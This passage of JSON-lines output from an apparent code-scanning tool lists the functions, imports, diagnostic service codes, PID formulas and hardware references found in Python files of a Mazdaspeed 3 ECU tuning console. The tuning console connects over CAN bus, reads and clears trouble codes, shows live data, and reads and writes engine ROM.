0x40"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "subfunction = message.data[2] if service_response == 0x7F else message.data[1]"}, {"type": "protocol", "line": 207, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.send_request(self.SERVICES['READ_DATA'], 0xF189)"}, {"type": "protocol", "line": 221, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.send_request(self.SERVICES['READ_DATA'], 0xF187)"}, {"type": "protocol", "line": 234, "protocol": "0x[0-9A-Fa-f]+", "content": "Read memory from ECU using ReadMemoryByAddress service (0x23)"}, {"type": "protocol", "line": 249, "protocol": "0x[0-9A-Fa-f]+", "content": "0x00,  # No subfunction"}, {"type": "protocol", "line": 263, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.send_request(self.SERVICES['READ_DATA'], 0x0201)"}, {"type": "protocol", "line": 270, "protocol": "0x[0-9A-Fa-f]+", "content": "if dtc_data[i] == 0x00 and dtc_data[i+1] == 0x00:"}, {"type": "protocol", "line": 295, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_type = (first_byte >> 6) & 0x03"}, {"type": "protocol", "line": 296, "protocol": "0x[0-9A-Fa-f]+", "content": "digit1 = (first_byte >> 4) & 0x03"}, {"type": "protocol", "line": 297, "protocol": "0x[0-9A-Fa-f]+", "content": "digit2 = first_byte & 0x0F"}, {"type": "protocol", "line": 298, "protocol": "0x[0-9A-Fa-f]+", "content": "digit3 = (second_byte >> 4) & 0x0F"}, {"type": "protocol", "line": 299, "protocol": "0x[0-9A-Fa-f]+", "content": "digit4 = second_byte & 0x0F"}, {"type": "protocol", "line": 334, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.send_request(0x14, 0xFF)  # ClearDTCInformation"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "return response.success and response.data[0] == 0x54"}, {"type": "protocol", "line": 340, "protocol": "PID", "content": "Read live data parameter using PID"}, {"type": "protocol", "line": 356, "protocol": "PID", "content": "\"\"\"Parse PID response data into physical value\"\"\""}, {"type": "protocol", "line": 359, "protocol": "0x[0-9A-Fa-f]+", "content": "0x04: lambda d: (d[0] * 100) / 255,  # Engine Load"}, {"type": "protocol", "line": 360, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: lambda d: d[0] - 40,           # Coolant Temp"}, {"type": "protocol", "line": 361, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C: lambda d: ((d[0] * 256) + d[1]) / 4,  # RPM"}, {"type": "protocol", "line": 362, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D: lambda d: d[0],                # Vehicle Speed"}, {"type": "protocol", "line": 363, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F: lambda d: d[0] - 40,           # Intake Air Temp"}, {"type": "protocol", "line": 364, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: lambda d: (d[0] * 100) / 255,  # Throttle Position"}, {"type": "protocol", "line": 367, "protocol": "0x[0-9A-Fa-f]+", "content": "0x223365: lambda d: ((d[0] * 256) + d[1] - 1000) / 10,  # Boost Pressure"}, {"type": "protocol", "line": 368, "protocol": "0x[0-9A-Fa-f]+", "content": "0x22345C: lambda d: (d[0] - 128) / 2,  # VVT Angle"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "ECU Communication Module - Handles all CAN bus and diagnostic communication"}, {"type": "hardware", "line": 3, "hardware": "CAN bus", "content": "ECU Communication Module - Handles all CAN bus and diagnostic communication"}, {"type": "hardware", "line": 4, "hardware": "ECU", "content": "with the Mazdaspeed 3 ECU. Reverse engineered from VersaTuner protocols."}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "class VersaTunerECU(ECUCommunicator):"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "VersaTuner specific ECU communication extensions"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "Builds on the core ECUCommunicator with VersaTuner protocols"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "ECU_REQUEST_ID = 0x7E0"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "ECU_RESPONSE_ID = 0x7E8"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "'ECU_RESET': 0x11,"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "'SECURITY_ACCESS': 0x27,"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "Initialize ECU communicator"}, {"type": "hardware", "line": 48, "hardware": "CAN bus", "content": "bitrate: CAN bus bitrate in bits per second"}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "self.security_level = 0"}, {"type": "hardware", "line": 65, "hardware": "CAN bus", "content": "Connect to CAN bus and initialize communication"}, {"type": "hardware", "line": 86, "hardware": "ECU", "content": "self.logger.info(f\"Connected to ECU on {self.interface}\")"}, {"type": "hardware", "line": 90, "hardware": "CAN bus", "content": "self.logger.error(f\"Failed to connect to CAN bus: {e}\")"}, {"type": "hardware", "line": 95, "hardware": "CAN bus", "content": "\"\"\"Disconnect from CAN bus and cleanup resources\"\"\""}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "self.logger.info(\"Disconnected from ECU\")"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "\"\"\"Test ECU communication by reading VIN\"\"\""}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "def send_request(self, service: int, subfunction: int, data: bytes = b'') -> ECUResponse:"}, {"type": "hardware", "line": 117, "hardware": "ECU", "content": "Send diagnostic request to ECU and wait for response"}, {"type": "hardware", "line": 125, "hardware": "ECU", "content": "ECUResponse: Response from ECU"}, {"type": "hardware", "line": 128, "hardware": "ECU", "content": "return ECUResponse(False, b'', time.time(), error_code=0xFF)"}, {"type": "hardware", "line": 135, "hardware": "ECU", "content": "arbitration_id=self.ECU_REQUEST_ID,"}, {"type": "hardware", "line": 162, "hardware": "ECU", "content": "return ECUResponse(True, response_data, time.time())"}, {"type": "hardware", "line": 164, "hardware": "ECU", "content": "return ECUResponse(False, b'', time.time(), error_code=0x78)  # Timeout"}, {"type": "hardware", "line": 168, "hardware": "ECU", "content": "return ECUResponse(False, b'', time.time(), error_code=0xFF)"}, {"type": "hardware", "line": 176, "hardware": "ECU", "content": "\"\"\"Background thread to listen for ECU responses\"\"\""}, {"type": "hardware", "line": 181, "hardware": "ECU", "content": "if (message and message.arbitration_id == self.ECU_RESPONSE_ID and"}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "Read Vehicle Identification Number from ECU"}, {"type": "hardware", "line": 202, "hardware": "vehicle", "content": "Read Vehicle Identification Number from ECU"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "def read_ecu_part_number(self) -> Optional[str]:"}, {"type": "hardware", "line": 220, "hardware": "ECU", "content": "\"\"\"Read ECU part number\"\"\""}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "def read_memory(self, address: int, length: int) -> ECUResponse:"}, {"type": "hardware", "line": 234, "hardware": "ECU", "content": "Read memory from ECU using ReadMemoryByAddress service (0x23)"}, {"type": "hardware", "line": 241, "hardware": "ECU", "content": "ECUResponse: Response containing memory data"}, {"type": "hardware", "line": 255, "hardware": "ECU", "content": "Read Diagnostic Trouble Codes from ECU"}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "'P0611': 'ECU Internal Control Module Memory Error',"}, {"type": "hardware", "line": 362, "hardware": "vehicle", "content": "0x0D: lambda d: d[0],                # Vehicle Speed"}], "security_logic": [{"type": "security_pattern", "line": 36, "pattern": "security_access", "content": "'SECURITY_ACCESS': 0x27,"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa10.py", "lines_read": 52, "features_found": [{"type": "function", "name": "main", "line": 14}, {"type": "import", "module": "src.interfaces.gui_main", "line": null}, {"type": "import", "module": "src.interfaces.tuning_console", "line": null}, {"type": "import", "module": "src.utils.logger", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "argparse", "line": null}, {"type": "import", "module": "VersaTunerGUI", "line": null}, {"type": "import", "module": "TuningConsole", "line": null}, {"type": "import", "module": "setup_application_logger", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 43, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa11.py", "lines_read": 577, "features_found": [{"type": "function", "name": "main", "line": 571}, {"type": "function", "name": "__init__", "line": 40}, {"type": "function", "name": "do_connect", "line": 59}, {"type": "function", "name": "do_disconnect", "line": 72}, {"type": "function", "name": "do_vehicle_info", "line": 81}, {"type": "function", "name": "_show_vehicle_info", "line": 88}, {"type": "function", "name": "do_unlock", "line": 106}, {"type": "function", "name": "do_read_rom", "line": 120}, {"type": "function", "name": "do_load_rom", "line": 149}, {"type": "function", "name": "do_verify_rom", "line": 163}, {"type": "function", "name": "do_list_maps", "line": 179}, {"type": "function", "name": "do_load_map", "line": 197}, {"type": "function", "name": "_display_map_preview", "line": 218}, {"type": "function", "name": "do_modify_map", "line": 243}, {"type": "function", "name": "do_global_adjust", "line": 270}, {"type": "function", "name": "do_create_tune", "line": 293}, {"type": "function", "name": "do_write_rom", "line": 336}, {"type": "function", "name": "do_read_dtcs", "line": 389}, {"type": "function", "name": "do_clear_dtcs", "line": 404}, {"type": "function", "name": "do_live_data", "line": 414}, {"type": "function", "name": "_get_pid_name", "line": 451}, {"type": "function", "name": "do_calculate_power", "line": 460}, {"type": "function", "name": "do_maintenance", "line": 474}, {"type": "function", "name": "do_export_maps", "line": 501}, {"type": "function", "name": "do_quit", "line": 511}, {"type": "function", "name": "_check_connection", "line": 518}, {"type": "function", "name": "do_exit", "line": 526}, {"type": "function", "name": "do_help", "line": 530}, {"type": "function", "name": "progress_callback", "line": 127}, {"type": "function", "name": "progress_callback", "line": 377}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "..core.ecu_communication", "line": null}, {"type": "import", "module": "..core.security_access", "line": null}, {"type": "import", "module": "..core.rom_operations", "line": null}, {"type": "import", "module": "..tuning.map_editor", "line": null}, {"type": "import", "module": "..tuning.realtime_tuning", "line": null}, {"type": "import", "module": "..vehicle.mazdaspeed3_2011", "line": null}, {"type": "import", "module": "..vehicle.diagnostic_services", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "..utils.file_operations", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "cmd", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "argparse", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}, {"type": "import", "module": "ROMOperations", "line": null}, {"type": "import", "module": "MapEditor", "line": null}, {"type": "import", "module": "RealTimeTuner", "line": null}, {"type": "import", "module": "Mazdaspeed32011", "line": null}, {"type": "import", "module": "DiagnosticManager", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}, {"type": "import", "module": "FileManager", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [{"type": "class", "name": "TuningConsole", "line": 25}], "algorithms": [{"type": "algorithm_function", "line": 460, "content": "def do_calculate_power(self, arg):"}], "protocols": [{"type": "protocol", "line": 420, "protocol": "0x[0-9A-Fa-f]+", "content": "pids = [0x0C, 0x0D, 0x11, 0x05, 0x0F, 0x223365, 0x223456]"}, {"type": "protocol", "line": 452, "protocol": "PID", "content": "\"\"\"Get PID name for display\"\"\""}, {"type": "protocol", "line": 454, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C: 'rpm', 0x0D: 'speed', 0x11: 'throttle',"}, {"type": "protocol", "line": 455, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: 'coolant_temp', 0x0F: 'intake_temp',"}, {"type": "protocol", "line": 456, "protocol": "0x[0-9A-Fa-f]+", "content": "0x223365: 'boost', 0x223456: 'knock_correction'"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from ..core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "from ..core.security_access import SecurityManager"}, {"type": "hardware", "line": 20, "hardware": "vehicle", "content": "from ..vehicle.mazdaspeed3_2011 import Mazdaspeed32011"}, {"type": "hardware", "line": 21, "hardware": "vehicle", "content": "from ..vehicle.diagnostic_services import DiagnosticManager"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "self.ecu_comm = ECUCommunicator()"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "self.security_mgr = SecurityManager(self.ecu_comm)"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "self.rom_ops = ROMOperations(self.ecu_comm)"}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "self.realtime_tuner = RealTimeTuner(self.ecu_comm)"}, {"type": "hardware", "line": 50, "hardware": "vehicle", "content": "self.vehicle = Mazdaspeed32011()"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "self.diagnostic_mgr = DiagnosticManager(self.ecu_comm)"}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "\"\"\"Connect to ECU: connect [interface=can0]\"\"\""}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "self.ecu_comm.interface = interface"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "print(f\"Connecting to ECU via {interface}...\")"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "if self.ecu_comm.connect():"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "print(\"\u2713 Successfully connected to ECU\")"}, {"type": "hardware", "line": 68, "hardware": "vehicle", "content": "self._show_vehicle_info()"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "print(\"\u2717 Failed to connect to ECU\")"}, {"type": "hardware", "line": 73, "hardware": "ECU", "content": "\"\"\"Disconnect from ECU\"\"\""}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "self.ecu_comm.disconnect()"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "print(\"Disconnected from ECU\")"}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "print(\"Not connected to ECU\")"}, {"type": "hardware", "line": 81, "hardware": "vehicle", "content": "def do_vehicle_info(self, arg):"}, {"type": "hardware", "line": 82, "hardware": "vehicle", "content": "\"\"\"Display vehicle information\"\"\""}, {"type": "hardware", "line": 86, "hardware": "vehicle", "content": "self._show_vehicle_info()"}, {"type": "hardware", "line": 88, "hardware": "vehicle", "content": "def _show_vehicle_info(self):"}, {"type": "hardware", "line": 89, "hardware": "vehicle", "content": "\"\"\"Display comprehensive vehicle information\"\"\""}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "info = self.rom_ops.read_ecu_info()"}, {"type": "hardware", "line": 91, "hardware": "vehicle", "content": "vehicle_info = self.vehicle.get_vehicle_info()"}, {"type": "hardware", "line": 94, "hardware": "vehicle", "content": "print(\"VEHICLE INFORMATION\")"}, {"type": "hardware", "line": 97, "hardware": "ECU", "content": "print(f\"ECU Part: {info.get('ecu_part_number', 'Unknown')}\")"}, {"type": "hardware", "line": 100, "hardware": "vehicle", "content": "print(f\"Model: {vehicle_info['model']} {vehicle_info['year']}\")"}, {"type": "hardware", "line": 101, "hardware": "vehicle", "content": "print(f\"Engine: {vehicle_info['engine_specs']['displacement']}L {vehicle_info['engine_specs']['aspir"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "print(f\"Power: {self.vehicle.ecu_calibrations['stock_power']['horsepower']}HP\")"}, {"type": "hardware", "line": 102, "hardware": "vehicle", "content": "print(f\"Power: {self.vehicle.ecu_calibrations['stock_power']['horsepower']}HP\")"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "print(f\"Torque: {self.vehicle.ecu_calibrations['stock_power']['torque']} lb-ft\")"}, {"type": "hardware", "line": 103, "hardware": "vehicle", "content": "print(f\"Torque: {self.vehicle.ecu_calibrations['stock_power']['torque']} lb-ft\")"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "\"\"\"Unlock ECU security: unlock [level=3]\"\"\""}, {"type": "hardware", "line": 112, "hardware": "ECU", "content": "print(f\"Unlocking ECU security level {level}...\")"}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "if self.security_mgr.unlock_ecu(level):"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "status = self.security_mgr.check_security_status()"}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "print(f\"\u2713 Security unlocked: {status['level_description']}\")"}, {"type": "hardware", "line": 118, "hardware": "ECU", "content": "print(\"\u2717 Failed to unlock ECU security\")"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "\"\"\"Read complete ROM from ECU: read_rom [output_file]\"\"\""}, {"type": "hardware", "line": 132, "hardware": "ECU", "content": "print(\"Reading ROM from ECU...\")"}, {"type": "hardware", "line": 324, "hardware": "vehicle", "content": "tune_info = self.vehicle.get_recommended_tunes(power_gains[stage])"}, {"type": "hardware", "line": 337, "hardware": "ECU", "content": "\"\"\"Write ROM to ECU: write_rom [filename]\"\"\""}, {"type": "hardware", "line": 369, "hardware": "ECU", "content": "response = input(\"WARNING: This will overwrite ECU ROM. Continue? (y/N): \")"}, {"type": "hardware", "line": 375, "hardware": "ECU", "content": "print(\"Writing ROM to ECU...\")"}, {"type": "hardware", "line": 385, "hardware": "ECU", "content": "print(\"\\n\u2713 ROM written to ECU successfully\")"}, {"type": "hardware", "line": 387, "hardware": "ECU", "content": "print(\"\\n\u2717 Failed to write ROM to ECU\")"}, {"type": "hardware", "line": 395, "hardware": "ECU", "content": "dtcs = self.ecu_comm.read_dtcs()"}, {"type": "hardware", "line": 409, "hardware": "ECU", "content": "if self.ecu_comm.clear_dtcs():"}, {"type": "hardware", "line": 430, "hardware": "ECU", "content": "value = self.ecu_comm.read_live_data(pid)"}, {"type": "hardware", "line": 464, "hardware": "vehicle", "content": "results = self.vehicle.calculate_safe_power_gains(modifications)"}, {"type": "hardware", "line": 468, "hardware": "ECU", "content": "print(f\"Base Power: {self.vehicle.ecu_calibrations['stock_power']['horsepower']} HP\")"}, {"type": "hardware", "line": 468, "hardware": "vehicle", "content": "print(f\"Base Power: {self.vehicle.ecu_calibrations['stock_power']['horsepower']} HP\")"}, {"type": "hardware", "line": 478, "hardware": "vehicle", "content": "schedule = self.vehicle.get_maintenance_schedule(mileage)"}, {"type": "hardware", "line": 514, "hardware": "ECU", "content": "self.ecu_comm.disconnect()"}, {"type": "hardware", "line": 519, "hardware": "ECU", "content": "\"\"\"Check if connected to ECU\"\"\""}, {"type": "hardware", "line": 521, "hardware": "ECU", "content": "print(\"Not connected to ECU. Use 'connect' first.\")"}, {"type": "hardware", "line": 540, "hardware": "ECU", "content": "print(\"  connect [interface]    - Connect to ECU\")"}, {"type": "hardware", "line": 541, "hardware": "ECU", "content": "print(\"  disconnect             - Disconnect from ECU\")"}, {"type": "hardware", "line": 542, "hardware": "vehicle", "content": "print(\"  vehicle_info           - Show vehicle information\")"}, {"type": "hardware", "line": 543, "hardware": "ECU", "content": "print(\"  unlock [level]         - Unlock ECU security\")"}, {"type": "hardware", "line": 546, "hardware": "ECU", "content": "print(\"  read_rom [file]        - Read ROM from ECU\")"}, {"type": "hardware", "line": 549, "hardware": "ECU", "content": "print(\"  write_rom [file]       - Write ROM to ECU\")"}], "security_logic": [{"type": "security_pattern", "line": 16, "pattern": "security_access", "content": "from ..core.security_access import SecurityManager"}, {"type": "security_pattern", "line": 448, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa12.py", "lines_read": 577, "features_found": [{"type": "function", "name": "main", "line": 571}, {"type": "function", "name": "__init__", "line": 32}, {"type": "function", "name": "do_connect", "line": 51}, {"type": "function", "name": "do_disconnect", "line": 70}, {"type": "function", "name": "_update_vehicle_info", "line": 82}, {"type": "function", "name": "do_unlock", "line": 94}, {"type": "function", "name": "do_read_rom", "line": 114}, {"type": "function", "name": "do_save_rom", "line": 146}, {"type": "function", "name": "do_load_rom", "line": 166}, {"type": "function", "name": "do_list_maps", "line": 182}, {"type": "function", "name": "do_load_map", "line": 204}, {"type": "function", "name": "_display_map_info", "line": 228}, {"type": "function", "name": "do_show_map", "line": 252}, {"type": "function", "name": "_display_map_data", "line": 263}, {"type": "function", "name": "do_set_value", "line": 293}, {"type": "function", "name": "do_adjust_map", "line": 322}, {"type": "function", "name": "do_write_rom", "line": 347}, {"type": "function", "name": "do_read_dtcs", "line": 380}, {"type": "function", "name": "do_clear_dtcs", "line": 402}, {"type": "function", "name": "do_live_data", "line": 419}, {"type": "function", "name": "_get_pid_name", "line": 447}, {"type": "function", "name": "do_create_tune", "line": 460}, {"type": "function", "name": "do_vehicle_info", "line": 492}, {"type": "function", "name": "do_verify_rom", "line": 520}, {"type": "function", "name": "do_quit", "line": 548}, {"type": "function", "name": "do_exit", "line": 558}, {"type": "function", "name": "emptyline", "line": 562}, {"type": "function", "name": "default", "line": 566}, {"type": "function", "name": "progress_callback", "line": 126}, {"type": "function", "name": "progress_callback", "line": 367}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "..core.ecu_communication", "line": null}, {"type": "import", "module": "..core.security_access", "line": null}, {"type": "import", "module": "..core.rom_operations", "line": null}, {"type": "import", "module": "..tuning.map_editor", "line": null}, {"type": "import", "module": "..tuning.map_definitions", "line": null}, {"type": "import", "module": "..vehicle.mazdaspeed3_2011", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "cmd", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "argparse", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}, {"type": "import", "module": "ROMOperations", "line": null}, {"type": "import", "module": "MapEditor", "line": null}, {"type": "import", "module": "MapDefinitionManager", "line": null}, {"type": "import", "module": "Mazdaspeed32011", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "TuningConsole", "line": 23}], "algorithms": [], "protocols": [{"type": "protocol", "line": 429, "protocol": "0x[0-9A-Fa-f]+", "content": "default_pids = [0x0C, 0x0D, 0x11, 0x05, 0x0F, 0x223365]"}, {"type": "protocol", "line": 448, "protocol": "PID", "content": "\"\"\"Get human-readable name for PID\"\"\""}, {"type": "protocol", "line": 450, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C: 'Engine RPM',"}, {"type": "protocol", "line": 451, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D: 'Vehicle Speed',"}, {"type": "protocol", "line": 452, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: 'Throttle Position',"}, {"type": "protocol", "line": 453, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: 'Coolant Temp',"}, {"type": "protocol", "line": 454, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F: 'Intake Air Temp',"}, {"type": "protocol", "line": 455, "protocol": "0x[0-9A-Fa-f]+", "content": "0x223365: 'Boost Pressure',"}, {"type": "protocol", "line": 456, "protocol": "0x[0-9A-Fa-f]+", "content": "0x223456: 'Knock Correction'"}, {"type": "protocol", "line": 458, "protocol": "PID", "content": "return pid_names.get(pid, f'PID_{pid:04X}')"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from ..core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "from ..core.security_access import SecurityManager"}, {"type": "hardware", "line": 20, "hardware": "vehicle", "content": "from ..vehicle.mazdaspeed3_2011 import Mazdaspeed32011"}, {"type": "hardware", "line": 37, "hardware": "ECU", "content": "self.ecu_comm = ECUCommunicator()"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "self.security_mgr = SecurityManager(self.ecu_comm)"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "self.rom_ops = ROMOperations(self.ecu_comm)"}, {"type": "hardware", "line": 42, "hardware": "vehicle", "content": "self.vehicle = Mazdaspeed32011()"}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "Connect to ECU"}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "self.ecu_comm.interface = interface"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "if self.ecu_comm.connect():"}, {"type": "hardware", "line": 63, "hardware": "ECU", "content": "print(f\"Connected to ECU on {interface}\")"}, {"type": "hardware", "line": 64, "hardware": "vehicle", "content": "self._update_vehicle_info()"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "print(\"Failed to connect to ECU\")"}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "Disconnect from ECU"}, {"type": "hardware", "line": 76, "hardware": "ECU", "content": "self.ecu_comm.disconnect()"}, {"type": "hardware", "line": 78, "hardware": "ECU", "content": "print(\"Disconnected from ECU\")"}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "print(\"Not connected to ECU\")"}, {"type": "hardware", "line": 82, "hardware": "vehicle", "content": "def _update_vehicle_info(self):"}, {"type": "hardware", "line": 83, "hardware": "vehicle", "content": "\"\"\"Update and display vehicle information\"\"\""}, {"type": "hardware", "line": 87, "hardware": "ECU", "content": "info = self.rom_ops.read_ecu_info()"}, {"type": "hardware", "line": 88, "hardware": "vehicle", "content": "print(\"\\n=== Vehicle Information ===\")"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "print(f\"ECU Part: {info.get('ecu_part_number', 'Unknown')}\")"}, {"type": "hardware", "line": 96, "hardware": "ECU", "content": "Unlock ECU security access"}, {"type": "hardware", "line": 100, "hardware": "ECU", "content": "print(\"Not connected to ECU\")"}, {"type": "hardware", "line": 106, "hardware": "ECU", "content": "if self.security_mgr.unlock_ecu(level):"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "status = self.security_mgr.check_security_status()"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "print(f\"Security unlocked: Level {status['current_level']}\")"}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "print(\"Failed to unlock ECU security\")"}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "Read complete ROM from ECU"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "print(\"Not connected to ECU\")"}, {"type": "hardware", "line": 124, "hardware": "ECU", "content": "print(\"Reading ROM from ECU...\")"}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "Write modified ROM to ECU"}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "print(\"Not connected to ECU\")"}, {"type": "hardware", "line": 365, "hardware": "ECU", "content": "print(\"Writing ROM to ECU...\")"}, {"type": "hardware", "line": 386, "hardware": "ECU", "content": "print(\"Not connected to ECU\")"}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "dtcs = self.ecu_comm.read_dtcs()"}, {"type": "hardware", "line": 408, "hardware": "ECU", "content": "print(\"Not connected to ECU\")"}, {"type": "hardware", "line": 412, "hardware": "ECU", "content": "if self.ecu_comm.clear_dtcs():"}, {"type": "hardware", "line": 425, "hardware": "ECU", "content": "print(\"Not connected to ECU\")"}, {"type": "hardware", "line": 440, "hardware": "ECU", "content": "value = self.ecu_comm.read_live_data(pid)"}, {"type": "hardware", "line": 451, "hardware": "vehicle", "content": "0x0D: 'Vehicle Speed',"}, {"type": "hardware", "line": 482, "hardware": "vehicle", "content": "recommendations = self.vehicle.get_recommended_tunes(power_gain)"}, {"type": "hardware", "line": 492, "hardware": "vehicle", "content": "def do_vehicle_info(self, arg):"}, {"type": "hardware", "line": 494, "hardware": "vehicle", "content": "Display vehicle information and specifications"}, {"type": "hardware", "line": 495, "hardware": "vehicle", "content": "Usage: vehicle_info"}, {"type": "hardware", "line": 497, "hardware": "vehicle", "content": "info = self.vehicle.get_vehicle_info()"}, {"type": "hardware", "line": 499, "hardware": "vehicle", "content": "print(\"\\n=== Vehicle Specifications ===\")"}, {"type": "hardware", "line": 554, "hardware": "ECU", "content": "self.ecu_comm.disconnect()"}], "security_logic": [{"type": "security_pattern", "line": 16, "pattern": "security_access", "content": "from ..core.security_access import SecurityManager"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
